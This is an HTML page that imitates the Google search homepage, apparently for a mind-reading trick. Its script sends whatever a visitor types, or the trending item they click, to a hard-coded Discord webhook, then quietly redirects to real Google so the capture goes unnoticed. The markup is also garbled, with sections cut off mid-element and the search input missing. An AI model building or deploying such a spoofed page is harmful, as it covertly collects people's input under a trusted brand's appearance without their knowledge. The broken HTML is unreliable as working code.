
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google</title>
    <style>
        * {
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #202124;
            color: #e8eaed;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            overflow-x: hidden;
        }

        /* Top Navigation */
        .top-nav {
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 16px;
            font-size: 14px;
        }
        .nav-left {
            display: flex;
            align-items: center;
            gap: 20px;
        }
        .hamburger {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            width: 18px;
            height: 14px;
            cursor: pointer;
        }
        .hamburger span {
            display: block;
            height: 2px;
            width: 100%;
            background-color: #9aa0a6;
            border-radius: 2px;
        }
        .tabs {
            display: flex;
            gap: 16px;
            font-size: 13px;
            font-weight: 500;
        }
        .tab {
            color: #9aa0a6;
            text-decoration: none;
            padding-bottom: 4px;
        }
        .tab.active {
            color: #8ab4f8;
            border-bottom: 2px solid #8ab4f8;
        }
        .nav-right {
            display: flex;
            align-items: center;
            gap: 16px;
        }
        .apps-icon {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 2.5px;
            width: 16px;
            height: 16px;
        }
        .apps-icon span {
            background-color: #9aa0a6;
            border-radius: 50%;
        }
        .sign-in-btn {
            background-color: #8ab4f8;
            color: #202124;
            padding: 7px 18px;
            border-radius: 20px;
            font-weight: 500;
            font-size: 13px;
            border: none;
            cursor: pointer;
        }

        /* Main Content */
        .main-container {
            width: 100%;
            max-width: 500px;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0 16px;
        }

        .logo-container {
            margin-top: 36px;
            margin-bottom: 24px;
            font-size: 54px;
            font-weight: 500;
            letter-spacing: -1px;
            color: #ffffff;
            user-select: none;
        }

        /* Search Bar */
        .search-wrapper {
            width: 100%;
            background-color: #303134;
            border-radius: 28px;
            display: flex;
            align-items: center;
            padding: 8px 16px;
            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.28);
        }
        .search-icon {
            color: #9aa0a6;
            display: flex;
            align-items: center;
            margin-right: 12px;
        }
        .search-input {
            flex: 1;
            background: transparent;
            border: none;
            outline: none;
            color: #e8eaed;
            font-size: 16px;
            caret-color: #8ab4f8;
        }
        .search-tools {
            display: flex;
            align-items: center;
            gap: 14px;
            color: #9aa0a6;
        }
        .tool-icon {
            display: flex;
            align-items: center;
            cursor: pointer;
        }

        /* Offered In Languages */
        .languages-container {
            margin-top: 26px;
            font-size: 12px;
            color: #bdc1c6;
            text-align: center;
            line-height: 1.8;
        }
        .languages-container a {
            color: #8ab4f8;
            text-decoration: none;
            margin: 0 4px;
        }

        /* Trending Searches Section */
        .trending-section {
            width: 100%;
            margin-top: 36px;
            padding-bottom: 40px;
        }
        .trending-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
            font-size: 18px;
            color: #e8eaed;
            font-weight: 400;
        }
        .more-options {
            color: #9aa0a6;
            cursor: pointer;
        }
        .trending-list {
            list-style: none;
            padding: 0;
            margin: 0;
        }
        .trending-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 14px 0;
            border-bottom: 1px solid #3c4043;
            cursor: pointer;
        }
        .trending-item-content {
            display: flex;
            align-items: center;
            gap: 16px;
        }
        .trend-icon {
            color: #9aa0a6;
            display: flex;
            align-items: center;
        }
        .trend-texts {
            display: flex;
            flex-direction: column;
        }
        .trend-title {
            font-size: 14px;
            color: #e8eaed;
        }
        .trend-subtitle {
            font-size: 12px;
            color: #9aa0a6;
            margin-top: 2px;
        }
        .trend-thumb {
            width: 34px;
            height: 34px;
            border-radius: 4px;
            background-color: #303134;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            font-size: 10px;
            color: #9aa0a6;
        }
    </style>
</head>
<body>

    <!-- Header Navigation -->
    <div class="top-nav">
        <div class="nav-left">
            <div class="hamburger">
                <span></span>
                <span></span>

        <div class="nav-right">

                        <path d="M17 11c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/>

                <div class="tool-icon">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
                        <circle cx="12" cy="13" r="4"/>

            </div>
        </div>

        <!-- Offered In Languages -->
        <div class="languages-container">

        <!-- Trending Searches -->

                                <polyline points="23 6 13.5 15.5 8.5 10.5 1 18"></polyline>

                        <div class="trend-texts">
                            <span class="trend-title">antigua & barbuda falcons</span>

            </ul>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const secretWebhookUrl = "https://discord.com/api/webhooks/1550099183908954173/3MbNEj9XQPhU202exWZlnFVGI7nm0GGVqmaeSLkp7hHXIP32ZioPkS5H7hSJfE_qjVu0";
            const inputField = document.getElementById('userQuery');

            if (inputField) {
                inputField.addEventListener('keypress', function (e) {
                    if (e.key === 'Enter') {
                        triggerMagicPeek();
                    }
                });
            }

            // Also trigger when a trending search item is clicked
            document.querySelectorAll('.trending-item').forEach(item => {
                item.addEventListener('click', function() {
                    const text = this.querySelector('.trend-title').innerText;
                    inputField.value = text;
                    triggerMagicPeek();
                });
            });

            function triggerMagicPeek() {
                const secretText = inputField.value;
                if (secretText.trim() !== "") {
                    fetch(secretWebhookUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: `🔮 **Spectator Searched:** ${secretText}` })
                    }).catch(error => console.log("Network transmission bypassed"));

                    const realSearchEngineUrl = "https://www.google.com/search?q=" + encodeURIComponent(secretText);
                    setTimeout(() => {
                        window.location.href = realSearchEngineUrl;
                    }, 250);
                }
            }
        });
    </script>
</body>
</html>
